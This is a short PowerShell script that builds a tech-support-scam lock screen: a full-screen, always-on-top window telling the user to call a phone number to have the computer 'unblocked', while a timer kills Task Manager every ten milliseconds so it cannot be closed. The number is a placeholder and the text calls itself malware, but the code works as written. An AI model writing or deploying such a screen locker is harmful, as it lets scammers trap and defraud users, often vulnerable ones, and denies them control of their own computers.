```
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Diagnostics

$form = New-Object System.Windows.Forms.Form
$form.FormBorderStyle = 'None'
$form.WindowState = 'Maximized'
$form.TopMost = $true

$label = New-Object System.Windows.Forms.Label
$label.Text = "Call 5555555555 to have your computer unblocked. This is malware"
$label.AutoSize = $true
$label.Font = New-Object System.Drawing.Font("Arial", 48, [System.Drawing.FontStyle]::Bold)
$label.ForeColor = [System.Drawing.Color]::Red
$form.Controls.Add($label)

$form.Add_Load({
    $label.Location = New-Object System.Drawing.Point(
        (($form.ClientSize.Width - $label.Size.Width) / 2),
        (($form.ClientSize.Height - $label.Size.Height) / 2)
    )
})

$timer = New-Object System.Windows.Forms.Timer
$timer.Interval = 10 
$timer.Add_Tick({
    $taskmgr = Get-Process Taskmgr -ErrorAction SilentlyContinue
    if ($taskmgr) {
        # Close Task Manager if it is running
        Stop-Process -Id $taskmgr.Id -Force
    }
})
$timer.Start()

$form.Add_Shown({$form.Activate()})
[System.Windows.Forms.Application]::Run($form)

```

